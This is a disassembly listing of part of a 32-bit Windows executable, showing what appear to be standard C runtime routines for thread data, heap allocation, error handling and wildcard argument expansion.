  405722:	ff 75 08             	push   0x8(%ebp)
  405725:	e8 3f 05 00 00       	call   0x405c69
  40572a:	59                   	pop    %ecx
  40572b:	59                   	pop    %ecx
  40572c:	5d                   	pop    %ebp
  40572d:	c2 04 00             	ret    $0x4
  405730:	8b ff                	mov    %edi,%edi
  405732:	55                   	push   %ebp
  405733:	8b ec                	mov    %esp,%ebp
  405735:	51                   	push   %ecx
  405736:	8b 45 08             	mov    0x8(%ebp),%eax
  405739:	8b 08                	mov    (%eax),%ecx
  40573b:	81 f9 90 dc 40 00    	cmp    $0x40dc90,%ecx
  405741:	74 0a                	je     0x40574d
  405743:	51                   	push   %ecx
  405744:	e8 20 05 00 00       	call   0x405c69
  405749:	8b 45 08             	mov    0x8(%ebp),%eax
  40574c:	59                   	pop    %ecx
  40574d:	ff 70 3c             	push   0x3c(%eax)
  405750:	e8 14 05 00 00       	call   0x405c69
  405755:	8b 45 08             	mov    0x8(%ebp),%eax
  405758:	ff 70 30             	push   0x30(%eax)
  40575b:	e8 09 05 00 00       	call   0x405c69
  405760:	8b 45 08             	mov    0x8(%ebp),%eax
  405763:	ff 70 34             	push   0x34(%eax)
  405766:	e8 fe 04 00 00       	call   0x405c69
  40576b:	8b 45 08             	mov    0x8(%ebp),%eax
  40576e:	ff 70 38             	push   0x38(%eax)
  405771:	e8 f3 04 00 00       	call   0x405c69
  405776:	8b 45 08             	mov    0x8(%ebp),%eax
  405779:	ff 70 28             	push   0x28(%eax)
  40577c:	e8 e8 04 00 00       	call   0x405c69
  405781:	8b 45 08             	mov    0x8(%ebp),%eax
  405784:	ff 70 2c             	push   0x2c(%eax)
  405787:	e8 dd 04 00 00       	call   0x405c69
  40578c:	8b 45 08             	mov    0x8(%ebp),%eax
  40578f:	ff 70 40             	push   0x40(%eax)
  405792:	e8 d2 04 00 00       	call   0x405c69
  405797:	8b 45 08             	mov    0x8(%ebp),%eax
  40579a:	ff 70 44             	push   0x44(%eax)
  40579d:	e8 c7 04 00 00       	call   0x405c69
  4057a2:	8b 45 08             	mov    0x8(%ebp),%eax
  4057a5:	ff b0 60 03 00 00    	push   0x360(%eax)
  4057ab:	e8 b9 04 00 00       	call   0x405c69
  4057b0:	8d 45 08             	lea    0x8(%ebp),%eax
  4057b3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4057b6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4057b9:	50                   	push   %eax
  4057ba:	6a 05                	push   $0x5
  4057bc:	e8 35 fe ff ff       	call   0x4055f6
  4057c1:	8d 45 08             	lea    0x8(%ebp),%eax
  4057c4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4057c7:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4057ca:	50                   	push   %eax
  4057cb:	6a 04                	push   $0x4
  4057cd:	e8 74 fe ff ff       	call   0x405646
  4057d2:	83 c4 34             	add    $0x34,%esp
  4057d5:	8b e5                	mov    %ebp,%esp
  4057d7:	5d                   	pop    %ebp
  4057d8:	c3                   	ret
  4057d9:	8b ff                	mov    %edi,%edi
  4057db:	55                   	push   %ebp
  4057dc:	8b ec                	mov    %esp,%ebp
  4057de:	56                   	push   %esi
  4057df:	8b 75 08             	mov    0x8(%ebp),%esi
  4057e2:	83 7e 4c 00          	cmpl   $0x0,0x4c(%esi)
  4057e6:	74 28                	je     0x405810
  4057e8:	ff 76 4c             	push   0x4c(%esi)
  4057eb:	e8 e3 22 00 00       	call   0x407ad3
  4057f0:	8b 46 4c             	mov    0x4c(%esi),%eax
  4057f3:	59                   	pop    %ecx
  4057f4:	3b 05 94 51 41 00    	cmp    0x415194,%eax
  4057fa:	74 14                	je     0x405810
  4057fc:	3d 80 45 41 00       	cmp    $0x414580,%eax
  405801:	74 0d                	je     0x405810
  405803:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  405807:	75 07                	jne    0x405810
  405809:	50                   	push   %eax
  40580a:	e8 f8 20 00 00       	call   0x407907
  40580f:	59                   	pop    %ecx
  405810:	8b 45 0c             	mov    0xc(%ebp),%eax
  405813:	89 46 4c             	mov    %eax,0x4c(%esi)
  405816:	5e                   	pop    %esi
  405817:	85 c0                	test   %eax,%eax
  405819:	74 07                	je     0x405822
  40581b:	50                   	push   %eax
  40581c:	e8 69 20 00 00       	call   0x40788a
  405821:	59                   	pop    %ecx
  405822:	5d                   	pop    %ebp
  405823:	c3                   	ret
  405824:	8b ff                	mov    %edi,%edi
  405826:	56                   	push   %esi
  405827:	57                   	push   %edi
  405828:	ff 15 74 d0 40 00    	call   *0x40d074
  40582e:	8b f0                	mov    %eax,%esi
  405830:	a1 50 40 41 00       	mov    0x414050,%eax
  405835:	83 f8 ff             	cmp    $0xffffffff,%eax
  405838:	74 0c                	je     0x405846
  40583a:	50                   	push   %eax
  40583b:	e8 c4 14 00 00       	call   0x406d04
  405840:	8b f8                	mov    %eax,%edi
  405842:	85 ff                	test   %edi,%edi
  405844:	75 49                	jne    0x40588f
  405846:	68 64 03 00 00       	push   $0x364
  40584b:	6a 01                	push   $0x1
  40584d:	e8 ba 03 00 00       	call   0x405c0c
  405852:	8b f8                	mov    %eax,%edi
  405854:	59                   	pop    %ecx
  405855:	59                   	pop    %ecx
  405856:	85 ff                	test   %edi,%edi
  405858:	75 09                	jne    0x405863
  40585a:	50                   	push   %eax
  40585b:	e8 09 04 00 00       	call   0x405c69
  405860:	59                   	pop    %ecx
  405861:	eb 38                	jmp    0x40589b
  405863:	57                   	push   %edi
  405864:	ff 35 50 40 41 00    	push   0x414050
  40586a:	e8 eb 14 00 00       	call   0x406d5a
  40586f:	85 c0                	test   %eax,%eax
  405871:	75 03                	jne    0x405876
  405873:	57                   	push   %edi
  405874:	eb e5                	jmp    0x40585b
  405876:	68 94 51 41 00       	push   $0x415194
  40587b:	57                   	push   %edi
  40587c:	e8 15 fe ff ff       	call   0x405696
  405881:	6a 00                	push   $0x0
  405883:	e8 e1 03 00 00       	call   0x405c69
  405888:	83 c4 0c             	add    $0xc,%esp
  40588b:	85 ff                	test   %edi,%edi
  40588d:	74 0c                	je     0x40589b
  40588f:	56                   	push   %esi
  405890:	ff 15 78 d0 40 00    	call   *0x40d078
  405896:	8b c7                	mov    %edi,%eax
  405898:	5f                   	pop    %edi
  405899:	5e                   	pop    %esi
  40589a:	c3                   	ret
  40589b:	56                   	push   %esi
  40589c:	ff 15 78 d0 40 00    	call   *0x40d078
  4058a2:	e8 1e fa ff ff       	call   0x4052c5
  4058a7:	cc                   	int3
  4058a8:	8b ff                	mov    %edi,%edi
  4058aa:	53                   	push   %ebx
  4058ab:	56                   	push   %esi
  4058ac:	57                   	push   %edi
  4058ad:	ff 15 74 d0 40 00    	call   *0x40d074
  4058b3:	8b f0                	mov    %eax,%esi
  4058b5:	33 db                	xor    %ebx,%ebx
  4058b7:	a1 50 40 41 00       	mov    0x414050,%eax
  4058bc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4058bf:	74 0c                	je     0x4058cd
  4058c1:	50                   	push   %eax
  4058c2:	e8 3d 14 00 00       	call   0x406d04
  4058c7:	8b f8                	mov    %eax,%edi
  4058c9:	85 ff                	test   %edi,%edi
  4058cb:	75 51                	jne    0x40591e
  4058cd:	68 64 03 00 00       	push   $0x364
  4058d2:	6a 01                	push   $0x1
  4058d4:	e8 33 03 00 00       	call   0x405c0c
  4058d9:	8b f8                	mov    %eax,%edi
  4058db:	59                   	pop    %ecx
  4058dc:	59                   	pop    %ecx
  4058dd:	85 ff                	test   %edi,%edi
  4058df:	75 09                	jne    0x4058ea
  4058e1:	53                   	push   %ebx
  4058e2:	e8 82 03 00 00       	call   0x405c69
  4058e7:	59                   	pop    %ecx
  4058e8:	eb 2b                	jmp    0x405915
  4058ea:	57                   	push   %edi
  4058eb:	ff 35 50 40 41 00    	push   0x414050
  4058f1:	e8 64 14 00 00       	call   0x406d5a
  4058f6:	85 c0                	test   %eax,%eax
  4058f8:	75 03                	jne    0x4058fd
  4058fa:	57                   	push   %edi
  4058fb:	eb e5                	jmp    0x4058e2
  4058fd:	68 94 51 41 00       	push   $0x415194
  405902:	57                   	push   %edi
  405903:	e8 8e fd ff ff       	call   0x405696
  405908:	53                   	push   %ebx
  405909:	e8 5b 03 00 00       	call   0x405c69
  40590e:	83 c4 0c             	add    $0xc,%esp
  405911:	85 ff                	test   %edi,%edi
  405913:	75 09                	jne    0x40591e
  405915:	56                   	push   %esi
  405916:	ff 15 78 d0 40 00    	call   *0x40d078
  40591c:	eb 09                	jmp    0x405927
  40591e:	56                   	push   %esi
  40591f:	ff 15 78 d0 40 00    	call   *0x40d078
  405925:	8b df                	mov    %edi,%ebx
  405927:	5f                   	pop    %edi
  405928:	5e                   	pop    %esi
  405929:	8b c3                	mov    %ebx,%eax
  40592b:	5b                   	pop    %ebx
  40592c:	c3                   	ret
  40592d:	68 0f 57 40 00       	push   $0x40570f
  405932:	e8 21 13 00 00       	call   0x406c58
  405937:	a3 50 40 41 00       	mov    %eax,0x414050
  40593c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40593f:	75 03                	jne    0x405944
  405941:	32 c0                	xor    %al,%al
  405943:	c3                   	ret
  405944:	e8 5f ff ff ff       	call   0x4058a8
  405949:	85 c0                	test   %eax,%eax
  40594b:	75 09                	jne    0x405956
  40594d:	50                   	push   %eax
  40594e:	e8 06 00 00 00       	call   0x405959
  405953:	59                   	pop    %ecx
  405954:	eb eb                	jmp    0x405941
  405956:	b0 01                	mov    $0x1,%al
  405958:	c3                   	ret
  405959:	a1 50 40 41 00       	mov    0x414050,%eax
  40595e:	83 f8 ff             	cmp    $0xffffffff,%eax
  405961:	74 0d                	je     0x405970
  405963:	50                   	push   %eax
  405964:	e8 45 13 00 00       	call   0x406cae
  405969:	83 0d 50 40 41 00 ff 	orl    $0xffffffff,0x414050
  405970:	b0 01                	mov    $0x1,%al
  405972:	c3                   	ret
  405973:	8b ff                	mov    %edi,%edi
  405975:	55                   	push   %ebp
  405976:	8b ec                	mov    %esp,%ebp
  405978:	81 ec 28 03 00 00    	sub    $0x328,%esp
  40597e:	a1 00 40 41 00       	mov    0x414000,%eax
  405983:	33 c5                	xor    %ebp,%eax
  405985:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405988:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  40598c:	57                   	push   %edi
  40598d:	74 09                	je     0x405998
  40598f:	ff 75 08             	push   0x8(%ebp)
  405992:	e8 a1 c1 ff ff       	call   0x401b38
  405997:	59                   	pop    %ecx
  405998:	6a 50                	push   $0x50
  40599a:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4059a0:	6a 00                	push   $0x0
  4059a2:	50                   	push   %eax
  4059a3:	e8 c8 cb ff ff       	call   0x402570
  4059a8:	68 cc 02 00 00       	push   $0x2cc
  4059ad:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  4059b3:	6a 00                	push   $0x0
  4059b5:	50                   	push   %eax
  4059b6:	e8 b5 cb ff ff       	call   0x402570
  4059bb:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4059c1:	83 c4 18             	add    $0x18,%esp
  4059c4:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  4059ca:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  4059d0:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  4059d6:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  4059dc:	89 8d dc fd ff ff    	mov    %ecx,-0x224(%ebp)
  4059e2:	89 95 d8 fd ff ff    	mov    %edx,-0x228(%ebp)
  4059e8:	89 9d d4 fd ff ff    	mov    %ebx,-0x22c(%ebp)
  4059ee:	89 b5 d0 fd ff ff    	mov    %esi,-0x230(%ebp)
  4059f4:	89 bd cc fd ff ff    	mov    %edi,-0x234(%ebp)
  4059fa:	66 8c 95 f8 fd ff ff 	data16 mov %ss,-0x208(%ebp)
  405a01:	66 8c 8d ec fd ff ff 	data16 mov %cs,-0x214(%ebp)
  405a08:	66 8c 9d c8 fd ff ff 	data16 mov %ds,-0x238(%ebp)
  405a0f:	66 8c 85 c4 fd ff ff 	data16 mov %es,-0x23c(%ebp)
  405a16:	66 8c a5 c0 fd ff ff 	data16 mov %fs,-0x240(%ebp)
  405a1d:	66 8c ad bc fd ff ff 	data16 mov %gs,-0x244(%ebp)
  405a24:	9c                   	pushf
  405a25:	8f 85 f0 fd ff ff    	pop    -0x210(%ebp)
  405a2b:	8b 45 04             	mov    0x4(%ebp),%eax
  405a2e:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  405a34:	8d 45 04             	lea    0x4(%ebp),%eax
  405a37:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
  405a3d:	c7 85 30 fd ff ff 01 	movl   $0x10001,-0x2d0(%ebp)
  405a44:	00 01 00 
  405a47:	8b 40 fc             	mov    -0x4(%eax),%eax
  405a4a:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  405a50:	8b 45 0c             	mov    0xc(%ebp),%eax
  405a53:	89 85 e0 fc ff ff    	mov    %eax,-0x320(%ebp)
  405a59:	8b 45 10             	mov    0x10(%ebp),%eax
  405a5c:	89 85 e4 fc ff ff    	mov    %eax,-0x31c(%ebp)
  405a62:	8b 45 04             	mov    0x4(%ebp),%eax
  405a65:	89 85 ec fc ff ff    	mov    %eax,-0x314(%ebp)
  405a6b:	ff 15 64 d0 40 00    	call   *0x40d064
  405a71:	6a 00                	push   $0x0
  405a73:	8b f8                	mov    %eax,%edi
  405a75:	ff 15 40 d0 40 00    	call   *0x40d040
  405a7b:	8d 85 d8 fc ff ff    	lea    -0x328(%ebp),%eax
  405a81:	50                   	push   %eax
  405a82:	ff 15 3c d0 40 00    	call   *0x40d03c
  405a88:	85 c0                	test   %eax,%eax
  405a8a:	75 13                	jne    0x405a9f
  405a8c:	85 ff                	test   %edi,%edi
  405a8e:	75 0f                	jne    0x405a9f
  405a90:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  405a94:	74 09                	je     0x405a9f
  405a96:	ff 75 08             	push   0x8(%ebp)
  405a99:	e8 9a c0 ff ff       	call   0x401b38
  405a9e:	59                   	pop    %ecx
  405a9f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405aa2:	33 cd                	xor    %ebp,%ecx
  405aa4:	5f                   	pop    %edi
  405aa5:	e8 b4 b7 ff ff       	call   0x40125e
  405aaa:	8b e5                	mov    %ebp,%esp
  405aac:	5d                   	pop    %ebp
  405aad:	c3                   	ret
  405aae:	8b ff                	mov    %edi,%edi
  405ab0:	55                   	push   %ebp
  405ab1:	8b ec                	mov    %esp,%ebp
  405ab3:	ff 75 08             	push   0x8(%ebp)
  405ab6:	b9 3c 4d 41 00       	mov    $0x414d3c,%ecx
  405abb:	e8 d7 e7 ff ff       	call   0x404297
  405ac0:	5d                   	pop    %ebp
  405ac1:	c3                   	ret
  405ac2:	8b ff                	mov    %edi,%edi
  405ac4:	55                   	push   %ebp
  405ac5:	8b ec                	mov    %esp,%ebp
  405ac7:	51                   	push   %ecx
  405ac8:	a1 00 40 41 00       	mov    0x414000,%eax
  405acd:	33 c5                	xor    %ebp,%eax
  405acf:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405ad2:	56                   	push   %esi
  405ad3:	e8 d0 fd ff ff       	call   0x4058a8
  405ad8:	85 c0                	test   %eax,%eax
  405ada:	74 35                	je     0x405b11
  405adc:	8b b0 5c 03 00 00    	mov    0x35c(%eax),%esi
  405ae2:	85 f6                	test   %esi,%esi
  405ae4:	74 2b                	je     0x405b11
  405ae6:	ff 75 18             	push   0x18(%ebp)
  405ae9:	ff 75 14             	push   0x14(%ebp)
  405aec:	ff 75 10             	push   0x10(%ebp)
  405aef:	ff 75 0c             	push   0xc(%ebp)
  405af2:	ff 75 08             	push   0x8(%ebp)
  405af5:	8b ce                	mov    %esi,%ecx
  405af7:	ff 15 3c d1 40 00    	call   *0x40d13c
  405afd:	ff d6                	call   *%esi
  405aff:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405b02:	83 c4 14             	add    $0x14,%esp
  405b05:	33 cd                	xor    %ebp,%ecx
  405b07:	5e                   	pop    %esi
  405b08:	e8 51 b7 ff ff       	call   0x40125e
  405b0d:	8b e5                	mov    %ebp,%esp
  405b0f:	5d                   	pop    %ebp
  405b10:	c3                   	ret
  405b11:	ff 75 18             	push   0x18(%ebp)
  405b14:	8b 35 00 40 41 00    	mov    0x414000,%esi
  405b1a:	8b ce                	mov    %esi,%ecx
  405b1c:	ff 75 14             	push   0x14(%ebp)
  405b1f:	33 35 3c 4d 41 00    	xor    0x414d3c,%esi
  405b25:	83 e1 1f             	and    $0x1f,%ecx
  405b28:	ff 75 10             	push   0x10(%ebp)
  405b2b:	d3 ce                	ror    %cl,%esi
  405b2d:	ff 75 0c             	push   0xc(%ebp)
  405b30:	ff 75 08             	push   0x8(%ebp)
  405b33:	85 f6                	test   %esi,%esi
  405b35:	75 be                	jne    0x405af5
  405b37:	e8 11 00 00 00       	call   0x405b4d
  405b3c:	cc                   	int3
  405b3d:	33 c0                	xor    %eax,%eax
  405b3f:	50                   	push   %eax
  405b40:	50                   	push   %eax
  405b41:	50                   	push   %eax
  405b42:	50                   	push   %eax
  405b43:	50                   	push   %eax
  405b44:	e8 79 ff ff ff       	call   0x405ac2
  405b49:	83 c4 14             	add    $0x14,%esp
  405b4c:	c3                   	ret
  405b4d:	6a 17                	push   $0x17
  405b4f:	e8 08 63 00 00       	call   0x40be5c
  405b54:	85 c0                	test   %eax,%eax
  405b56:	74 05                	je     0x405b5d
  405b58:	6a 05                	push   $0x5
  405b5a:	59                   	pop    %ecx
  405b5b:	cd 29                	int    $0x29
  405b5d:	56                   	push   %esi
  405b5e:	6a 01                	push   $0x1
  405b60:	be 17 04 00 c0       	mov    $0xc0000417,%esi
  405b65:	56                   	push   %esi
  405b66:	6a 02                	push   $0x2
  405b68:	e8 06 fe ff ff       	call   0x405973
  405b6d:	83 c4 0c             	add    $0xc,%esp
  405b70:	56                   	push   %esi
  405b71:	ff 15 44 d0 40 00    	call   *0x40d044
  405b77:	50                   	push   %eax
  405b78:	ff 15 48 d0 40 00    	call   *0x40d048
  405b7e:	5e                   	pop    %esi
  405b7f:	c3                   	ret
  405b80:	8b ff                	mov    %edi,%edi
  405b82:	55                   	push   %ebp
  405b83:	8b ec                	mov    %esp,%ebp
  405b85:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405b88:	33 c0                	xor    %eax,%eax
  405b8a:	3b 0c c5 d0 dd 40 00 	cmp    0x40ddd0(,%eax,8),%ecx
  405b91:	74 27                	je     0x405bba
  405b93:	40                   	inc    %eax
  405b94:	83 f8 2d             	cmp    $0x2d,%eax
  405b97:	72 f1                	jb     0x405b8a
  405b99:	8d 41 ed             	lea    -0x13(%ecx),%eax
  405b9c:	83 f8 11             	cmp    $0x11,%eax
  405b9f:	77 05                	ja     0x405ba6
  405ba1:	6a 0d                	push   $0xd
  405ba3:	58                   	pop    %eax
  405ba4:	5d                   	pop    %ebp
  405ba5:	c3                   	ret
  405ba6:	8d 81 44 ff ff ff    	lea    -0xbc(%ecx),%eax
  405bac:	6a 0e                	push   $0xe
  405bae:	59                   	pop    %ecx
  405baf:	3b c8                	cmp    %eax,%ecx
  405bb1:	1b c0                	sbb    %eax,%eax
  405bb3:	23 c1                	and    %ecx,%eax
  405bb5:	83 c0 08             	add    $0x8,%eax
  405bb8:	5d                   	pop    %ebp
  405bb9:	c3                   	ret
  405bba:	8b 04 c5 d4 dd 40 00 	mov    0x40ddd4(,%eax,8),%eax
  405bc1:	5d                   	pop    %ebp
  405bc2:	c3                   	ret
  405bc3:	8b ff                	mov    %edi,%edi
  405bc5:	55                   	push   %ebp
  405bc6:	8b ec                	mov    %esp,%ebp
  405bc8:	56                   	push   %esi
  405bc9:	e8 18 00 00 00       	call   0x405be6
  405bce:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405bd1:	51                   	push   %ecx
  405bd2:	89 08                	mov    %ecx,(%eax)
  405bd4:	e8 a7 ff ff ff       	call   0x405b80
  405bd9:	59                   	pop    %ecx
  405bda:	8b f0                	mov    %eax,%esi
  405bdc:	e8 18 00 00 00       	call   0x405bf9
  405be1:	89 30                	mov    %esi,(%eax)
  405be3:	5e                   	pop    %esi
  405be4:	5d                   	pop    %ebp
  405be5:	c3                   	ret
  405be6:	e8 bd fc ff ff       	call   0x4058a8
  405beb:	85 c0                	test   %eax,%eax
  405bed:	75 06                	jne    0x405bf5
  405bef:	b8 58 40 41 00       	mov    $0x414058,%eax
  405bf4:	c3                   	ret
  405bf5:	83 c0 14             	add    $0x14,%eax
  405bf8:	c3                   	ret
  405bf9:	e8 aa fc ff ff       	call   0x4058a8
  405bfe:	85 c0                	test   %eax,%eax
  405c00:	75 06                	jne    0x405c08
  405c02:	b8 54 40 41 00       	mov    $0x414054,%eax
  405c07:	c3                   	ret
  405c08:	83 c0 10             	add    $0x10,%eax
  405c0b:	c3                   	ret
  405c0c:	8b ff                	mov    %edi,%edi
  405c0e:	55                   	push   %ebp
  405c0f:	8b ec                	mov    %esp,%ebp
  405c11:	56                   	push   %esi
  405c12:	8b 75 08             	mov    0x8(%ebp),%esi
  405c15:	85 f6                	test   %esi,%esi
  405c17:	74 0c                	je     0x405c25
  405c19:	6a e0                	push   $0xffffffe0
  405c1b:	33 d2                	xor    %edx,%edx
  405c1d:	58                   	pop    %eax
  405c1e:	f7 f6                	div    %esi
  405c20:	3b 45 0c             	cmp    0xc(%ebp),%eax
  405c23:	72 34                	jb     0x405c59
  405c25:	0f af 75 0c          	imul   0xc(%ebp),%esi
  405c29:	85 f6                	test   %esi,%esi
  405c2b:	75 17                	jne    0x405c44
  405c2d:	46                   	inc    %esi
  405c2e:	eb 14                	jmp    0x405c44
  405c30:	e8 be f0 ff ff       	call   0x404cf3
  405c35:	85 c0                	test   %eax,%eax
  405c37:	74 20                	je     0x405c59
  405c39:	56                   	push   %esi
  405c3a:	e8 53 21 00 00       	call   0x407d92
  405c3f:	59                   	pop    %ecx
  405c40:	85 c0                	test   %eax,%eax
  405c42:	74 15                	je     0x405c59
  405c44:	56                   	push   %esi
  405c45:	6a 08                	push   $0x8
  405c47:	ff 35 a0 51 41 00    	push   0x4151a0
  405c4d:	ff 15 d0 d0 40 00    	call   *0x40d0d0
  405c53:	85 c0                	test   %eax,%eax
  405c55:	74 d9                	je     0x405c30
  405c57:	eb 0d                	jmp    0x405c66
  405c59:	e8 9b ff ff ff       	call   0x405bf9
  405c5e:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  405c64:	33 c0                	xor    %eax,%eax
  405c66:	5e                   	pop    %esi
  405c67:	5d                   	pop    %ebp
  405c68:	c3                   	ret
  405c69:	8b ff                	mov    %edi,%edi
  405c6b:	55                   	push   %ebp
  405c6c:	8b ec                	mov    %esp,%ebp
  405c6e:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405c72:	74 2d                	je     0x405ca1
  405c74:	ff 75 08             	push   0x8(%ebp)
  405c77:	6a 00                	push   $0x0
  405c79:	ff 35 a0 51 41 00    	push   0x4151a0
  405c7f:	ff 15 d4 d0 40 00    	call   *0x40d0d4
  405c85:	85 c0                	test   %eax,%eax
  405c87:	75 18                	jne    0x405ca1
  405c89:	56                   	push   %esi
  405c8a:	e8 6a ff ff ff       	call   0x405bf9
  405c8f:	8b f0                	mov    %eax,%esi
  405c91:	ff 15 74 d0 40 00    	call   *0x40d074
  405c97:	50                   	push   %eax
  405c98:	e8 e3 fe ff ff       	call   0x405b80
  405c9d:	59                   	pop    %ecx
  405c9e:	89 06                	mov    %eax,(%esi)
  405ca0:	5e                   	pop    %esi
  405ca1:	5d                   	pop    %ebp
  405ca2:	c3                   	ret
  405ca3:	8b ff                	mov    %edi,%edi
  405ca5:	55                   	push   %ebp
  405ca6:	8b ec                	mov    %esp,%ebp
  405ca8:	8b 45 0c             	mov    0xc(%ebp),%eax
  405cab:	3b 45 08             	cmp    0x8(%ebp),%eax
  405cae:	76 05                	jbe    0x405cb5
  405cb0:	83 c8 ff             	or     $0xffffffff,%eax
  405cb3:	5d                   	pop    %ebp
  405cb4:	c3                   	ret
  405cb5:	1b c0                	sbb    %eax,%eax
  405cb7:	f7 d8                	neg    %eax
  405cb9:	5d                   	pop    %ebp
  405cba:	c3                   	ret
  405cbb:	8b ff                	mov    %edi,%edi
  405cbd:	55                   	push   %ebp
  405cbe:	8b ec                	mov    %esp,%ebp
  405cc0:	8b 45 0c             	mov    0xc(%ebp),%eax
  405cc3:	83 ec 20             	sub    $0x20,%esp
  405cc6:	56                   	push   %esi
  405cc7:	85 c0                	test   %eax,%eax
  405cc9:	75 16                	jne    0x405ce1
  405ccb:	e8 29 ff ff ff       	call   0x405bf9
  405cd0:	6a 16                	push   $0x16
  405cd2:	5e                   	pop    %esi
  405cd3:	89 30                	mov    %esi,(%eax)
  405cd5:	e8 63 fe ff ff       	call   0x405b3d
  405cda:	8b c6                	mov    %esi,%eax
  405cdc:	e9 58 01 00 00       	jmp    0x405e39
  405ce1:	8b 75 08             	mov    0x8(%ebp),%esi
  405ce4:	33 c9                	xor    %ecx,%ecx
  405ce6:	53                   	push   %ebx
  405ce7:	57                   	push   %edi
  405ce8:	89 08                	mov    %ecx,(%eax)
  405cea:	8b f9                	mov    %ecx,%edi
  405cec:	8b d9                	mov    %ecx,%ebx
  405cee:	89 7d e0             	mov    %edi,-0x20(%ebp)
  405cf1:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  405cf4:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  405cf7:	39 0e                	cmp    %ecx,(%esi)
  405cf9:	74 56                	je     0x405d51
  405cfb:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405cfe:	66 c7 45 fc 2a 3f    	movw   $0x3f2a,-0x4(%ebp)
  405d04:	50                   	push   %eax
  405d05:	ff 36                	push   (%esi)
  405d07:	88 4d fe             	mov    %cl,-0x2(%ebp)
  405d0a:	e8 c1 30 00 00       	call   0x408dd0
  405d0f:	59                   	pop    %ecx
  405d10:	59                   	pop    %ecx
  405d11:	85 c0                	test   %eax,%eax
  405d13:	75 14                	jne    0x405d29
  405d15:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405d18:	50                   	push   %eax
  405d19:	6a 00                	push   $0x0
  405d1b:	6a 00                	push   $0x0
  405d1d:	ff 36                	push   (%esi)
  405d1f:	e8 27 01 00 00       	call   0x405e4b
  405d24:	83 c4 10             	add    $0x10,%esp
  405d27:	eb 0f                	jmp    0x405d38
  405d29:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  405d2c:	51                   	push   %ecx
  405d2d:	50                   	push   %eax
  405d2e:	ff 36                	push   (%esi)
  405d30:	e8 ac 01 00 00       	call   0x405ee1
  405d35:	83 c4 0c             	add    $0xc,%esp
  405d38:	8b f8                	mov    %eax,%edi
  405d3a:	85 ff                	test   %edi,%edi
  405d3c:	0f 85 eb 00 00 00    	jne    0x405e2d
  405d42:	83 c6 04             	add    $0x4,%esi
  405d45:	33 c9                	xor    %ecx,%ecx
  405d47:	39 0e                	cmp    %ecx,(%esi)
  405d49:	75 b0                	jne    0x405cfb
  405d4b:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  405d4e:	8b 7d e0             	mov    -0x20(%ebp),%edi
  405d51:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  405d55:	8b c3                	mov    %ebx,%eax
  405d57:	2b c7                	sub    %edi,%eax
  405d59:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405d5c:	8b d0                	mov    %eax,%edx
  405d5e:	83 c0 03             	add    $0x3,%eax
  405d61:	c1 fa 02             	sar    $0x2,%edx
  405d64:	42                   	inc    %edx
  405d65:	c1 e8 02             	shr    $0x2,%eax
  405d68:	3b df                	cmp    %edi,%ebx
  405d6a:	89 55 f4             	mov    %edx,-0xc(%ebp)
  405d6d:	1b f6                	sbb    %esi,%esi
  405d6f:	f7 d6                	not    %esi
  405d71:	23 f0                	and    %eax,%esi
  405d73:	74 30                	je     0x405da5
  405d75:	8b d7                	mov    %edi,%edx
  405d77:	8b d9                	mov    %ecx,%ebx
  405d79:	8b 0a                	mov    (%edx),%ecx
  405d7b:	8d 41 01             	lea    0x1(%ecx),%eax
  405d7e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405d81:	8a 01                	mov    (%ecx),%al
  405d83:	41                   	inc    %ecx
  405d84:	84 c0                	test   %al,%al
  405d86:	75 f9                	jne    0x405d81
  405d88:	2b 4d fc             	sub    -0x4(%ebp),%ecx
  405d8b:	43                   	inc    %ebx
  405d8c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405d8f:	03 d9                	add    %ecx,%ebx
  405d91:	83 c2 04             	add    $0x4,%edx
  405d94:	40                   	inc    %eax
  405d95:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405d98:	3b c6                	cmp    %esi,%eax
  405d9a:	75 dd                	jne    0x405d79
  405d9c:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405d9f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  405da2:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  405da5:	6a 01                	push   $0x1
  405da7:	ff 75 fc             	push   -0x4(%ebp)
  405daa:	52                   	push   %edx
  405dab:	e8 3c e8 ff ff       	call   0x4045ec
  405db0:	8b f0                	mov    %eax,%esi
  405db2:	83 c4 0c             	add    $0xc,%esp
  405db5:	85 f6                	test   %esi,%esi
  405db7:	75 05                	jne    0x405dbe
  405db9:	83 cf ff             	or     $0xffffffff,%edi
